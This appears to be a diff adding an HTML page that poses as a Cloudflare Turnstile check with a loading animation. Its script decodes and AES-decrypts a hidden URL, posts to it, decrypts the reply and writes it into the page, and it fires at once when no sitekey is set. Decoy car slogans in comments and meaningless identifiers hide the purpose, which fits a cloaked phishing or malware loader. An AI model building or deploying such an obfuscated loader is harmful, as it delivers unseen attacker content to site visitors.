@@ -1,0 +1,30 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script>
+  <style>body, html {height: 100%;margin: 0;display: flex;align-items: center;justify-content: center;}@keyframes bounce {0%, 100%, 12.5%, 32.5%, 76.1% {transform: translateY(0);}22.5%, 86% {transform: translateY(7px);}}#quadrillion {height: 179px;width: 130px;overflow: hidden;margin-top: -59px;margin-left: 25px;}@keyframes shadow-fade {0%, 100%, 21.2%, 80% {opacity: 0;}47%, 70% {opacity: 1;}}#backfield {width: 130px;margin-top: 179px;}#nail {width: 130px;height: 71px;border-radius: 0 0 7px 7px;overflow: hidden;margin-top: -41px;}#nail>.vainly {width: 287px;height: 71px;background: #27a0e0;transform: translate(-153px, -70px) rotate(28deg);}#nail>.kaolin {width: 287px;height: 71px;background: #1388d6;transform: translate(-120px, 63px) rotate(-28deg);}#dadaism {width: 130px;height: 40px;background: #113864;margin-top: -70px;}#quadraphonic {display: flex;flex-wrap: wrap;width: 118px;height: 131px;border-radius: 7px;overflow: hidden;margin: 0 auto;margin-top: -306px;animation: cal-bounce 5s infinite;animation-timing-function: cubic-bezier(0, 0.5, 0, 1);transform: translateY(51px) scaleY(1);}@keyframes cal-bounce {0%, 100%, 16.5%, 76.1% {transform: translateY(151px) scaleY(1);}28% {transform: translateY(39px) scaleY(1);}31% {transform: translateY(51px) scaleY(1.05);}33% {transform: translateY(51px) scaleY(.96);}34%, 68.5% {transform: translateY(51px) scaleY(1);}68.5% {animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);}}#quadraphonic>.yellowish {width: 118px;height: 21px;margin-bottom: -1px;background: #0354a1;}#quadraphonic>.kaolin {display: flex;width: 118px;height: 37px;}.macron {width: 39.3333px;height: 38px;}.vagueness {background: #0073cc;}.laboratory {background: #27a0e0;}.zodiacal {background: #4fcfff;}.jailbreak {background: #035fb3;}.cabochon {background: #134276;}#raccoon {width: 130px;height: 107px;animation: opened-flap-swing 5s infinite;animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);transform-origin: top;transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);}@keyframes opened-flap-swing {0%, 100%, 14.5%, 76% {transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);}16.5%, 74% {transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);}}#pact {width: 130px;animation: closed-flap-swing 5s infinite;animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);transform-origin: top;transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);}@keyframes closed-flap-swing {0%, 100%, 77%, 8.5% {transform: translateY(-71px) rotate3d(1, 0, 0, 0);}14.5%, 76% {transform: translateY(-71px) rotate3d(1, 0, 0, 90deg);}}#factitious {width: 130px;height: 107px;overflow: hidden;}.habitue {width: 96px;height: 96px;background: #4fcfff;margin: -48px auto 0 auto;border-radius: 7px;transform: scaleY(.6) rotate(45deg);}#raccoon .habitue {background: #113864;}#pact .habitue {background: #4fcfff;}</style>
+ </head>
+ <body>
+	<span class="cf-turnstile" id="mach" data-sitekey="" data-callback="facing"></span>
+	<!-- <span>Life’s milestones are marked by the cars we drive.</span> -->
+	<div id="quadrillion" hidden><div id="backfield"><div id="raccoon"><div id="factitious"><div class="habitue"></div></div></div><div id="quadraphonic"><div class="yellowish"></div><div class="kaolin"><div class="macron vagueness"></div><div class="macron laboratory"></div><div class="macron zodiacal"></div></div><div class="kaolin"><div class="macron jailbreak"></div><div class="macron vagueness"></div><div class="macron laboratory"></div></div><div class="kaolin"><div class="macron cabochon"></div><div class="macron jailbreak"></div><div class="macron vagueness"></div></div></div></div><div id="dadaism"></div> <!-- <p>The road is an endless source of inspiration.</p> -->
+	<div id="nail"><div class="kaolin"></div><div class="vainly"></div></div><div id="pact"><div id="factitious"><div class="habitue"></div></div></div></div>
+	<!-- <span>A car’s character is revealed with every mile.</span> -->
+ </body>
+<script>
+    async function racy(xenophobic) { <!-- A car’s history echoes in every mile. -->
+        var {a,b,c,d} = JSON.parse(xenophobic);
+        return CryptoJS.AES.decrypt(a, CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d), CryptoJS.enc.Hex.parse(b), {hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999}), {iv: CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
+    }
+    async function facing() {
+		quadrillion.hidden = 0;
+		mach.hidden = 1;
+        document.write(await racy(await (await fetch(await racy(atob(`eyJhIjoiYURqOGt3VUlmTE9CN1d2K1pmMWk2bHp2M0paVG1BTmVrSjRMU2xlZ1RPMD0iLCJjIjoiYzc0ZTg5MjVmN2NiMmFmNDQ1ZGVlZjdiNmNiMGE4OTIiLCJiIjoiMjFlODYxM2VmODFhYmFmNDVlYzg5MzM2ZmEwNDY2ZWQwZDc0ODg2NDQ4ZWRmZTgzM2IwOWRhNzhkM2MwY2QxNWFhMDU3ODEzYjkwMGQ1M2MyZDdlZTUwMTE3M2U2NDhjMDMzMTY2MGMzNjYzNGYyNjNkZjY2ODU0NzMyYTJmYTNhYTkzMDIxMjBlNzVlODliMmEyNDRhMmFhMmY0MzExMjE4MzAyZTlkN2Y0ZTUxNGRjNTYyMTZmMTc0ZGUxYTgwMTMzMjljYzc4OTA3YTEyYzU4YTg4YmRhYWQ2MTJkMzE1ZTQ3MTViNWU4NjQ1NjI2YjMwNjlkZDM3YjNmZTQ0MDAyMTMzNWUwMWI2NTg3NWJiMGNmZDMxNThlZjNiMjY5ZmYzMmViMGNjZDFiYzJjYmMzYmU5MWFlMzQ5ODFiZmNkYzg2NmQ0MGM0YzFlNDVhYzk2ODk3YWNlMzVlMzRhOTVjZjRhNWJhYjg0Zjk3NDIxZGJmNjZkMjhlMTFhMjhmODdmZWNkYjU5ZDcwNDIyZDdlNjFkODdlZmM1YmEyODI5ZGQ1NTBjMTYxMDc1NGI1Nzc4ZTEwYzQ5Y2U3MTY1YTcwN2NjYmRkMDQ5MmE0ZDVkOGViMGU2OGMyNThhODgzMTgwYmQwMzRiZmU3NjIzZmRkMmRhNDhhOTNmZGJlYjciLCJkIjoiNjQ2MTY5NmU3NDc5In0=`)), { <!-- <span>The best roads are the ones less traveled.</span> -->
+            method: 'POST', body: JSON.stringify({ facing: "waiter" })
+        })).text()));
+    } if (!mach.dataset.sitekey) {facing()}
+</script>
+<!-- <p>Embrace the road; it leads to new beginnings.</p> -->
+</html>
